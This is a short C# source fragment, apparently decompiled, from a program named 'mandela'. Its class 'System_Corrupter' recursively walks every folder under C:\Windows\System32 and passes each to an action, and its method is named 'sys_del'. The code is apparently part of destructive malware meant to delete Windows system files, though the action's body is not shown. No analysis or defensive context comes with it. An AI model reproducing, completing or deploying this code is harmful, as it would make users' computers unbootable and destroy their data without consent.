using System;
using System.IO;
using SysPrivileges;

namespace mandela
{
	// Token: 0x0200000D RID: 13
	public class System_Corrupter : Privileges
	{
		// Token: 0x06000034 RID: 52 RVA: 0x000062D8 File Offset: 0x000044D8
		private static void smethod_0(string string_0, Action<string> action_0)
		{
			try
			{
				foreach (string text in Directory.GetDirectories(string_0))
				{
					action_0(text);
					System_Corrupter.smethod_0(text, action_0);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00006324 File Offset: 0x00004524
		public void sys_del()
		{
			System_Corrupter.smethod_0("C:\\Windows\\System32\\", new Action<string>(System_Corrupter.<>c.<>c_0.method_0));
		}
	}
}
